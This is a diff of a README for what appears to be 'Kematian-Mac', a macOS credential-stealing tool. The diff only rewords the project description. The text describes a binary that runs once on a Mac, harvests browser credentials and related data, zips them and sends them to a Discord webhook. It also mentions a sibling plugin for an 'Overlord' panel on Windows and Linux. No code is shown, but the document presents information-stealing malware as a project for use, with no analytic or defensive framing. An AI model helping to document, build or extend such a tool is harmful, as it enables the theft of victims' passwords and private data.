@@ -1,10 +1,10 @@
 # Kematian-Mac
 
-**Standalone macOS project** — not part of Overlord / StuartPirate.
+**Standalone macOS-only project** — not part of Overlord / StuartPirate.
 
-Harvest binary built from **Kematian-main** recovery source. Runs once on a Mac, collects browser credentials and related data, zips the results, and posts to a **Discord webhook**.
+Harvest binary built from **Kematian-main** recovery source (`recovery/` is macOS code only — no Windows/Linux paths). Runs once on a Mac, collects browser credentials and related data, zips the results, and posts to a **Discord webhook**.
 
-Overlord uses the separate **Kematian Overlord plugin** (`kematian.zip` + panel) on Windows/Linux. This repo is only for the independent Mac executable.
+Overlord uses the separate **Kematian Overlord plugin** on Windows/Linux. This repo is only the independent Mac executable.
 
 ## Build (on a Mac)
 
